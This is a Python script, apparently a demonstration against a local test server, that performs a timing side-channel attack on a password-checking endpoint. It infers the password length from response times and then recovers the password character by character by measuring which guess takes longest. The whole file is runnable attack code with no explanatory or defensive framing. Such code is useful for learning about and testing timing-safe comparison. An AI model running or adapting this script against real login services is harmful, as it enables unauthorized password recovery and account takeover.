import requests
import time
import string

# Target Server
TARGET_URL = "http://localhost:5555/auth_password"
symbols = "!@#$%&*+-=()[]{}"
CHARACTER_SET = string.ascii_letters + string.digits + symbols

def find_password_length(max_length=64):
    max_time = 0
    correct_length = 0
    
    for length in range(1, max_length + 1):
        attempt = "A" * length 
        
        start_time = time.time()
        response = requests.post(TARGET_URL, json={"password": attempt})
        elapsed_time = time.time() - start_time

        print(f"Length {length}: {elapsed_time:.4f} seconds")

        if elapsed_time > max_time:
            max_time = elapsed_time
            correct_length = length

    print(f"\x1b[32m[Done] length {correct_length}: {max_time}\x1b[0m")
    print(f"Guessed password length: {correct_length}")
    return correct_length

def timing_attack():
    password_length = find_password_length()
    guessed_password = ""
    
    for _ in range(password_length):
        max_time = 0
        correct_char = None

        for char in CHARACTER_SET:
            attempt = guessed_password + char
            padding = "A" * (password_length - len(attempt))
            attempt += padding

            print(f"\rTrying: \x1b[33m{guessed_password}\x1b[31m{char}\x1b[0m{padding}", end="")

            start_time = time.time()
            
            response = requests.post(TARGET_URL, json={"password": attempt})
            elapsed_time = time.time() - start_time

            if response.json().get("result", False):
                print("\r\x1b[2K", end="")
                return attempt

            if elapsed_time > max_time:
                max_time = elapsed_time
                correct_char = char

        guessed_password += correct_char


    print("\r\x1b[2K", end="")
    return guessed_password

if __name__ == "__main__":
    print("Start timing attack...")
    start_time = time.time()
    final_password = timing_attack()
    elapsed_time = time.time() - start_time
    print(f"\nFinal password: {final_password}")
    print(f"Elapsed time: {elapsed_time}")
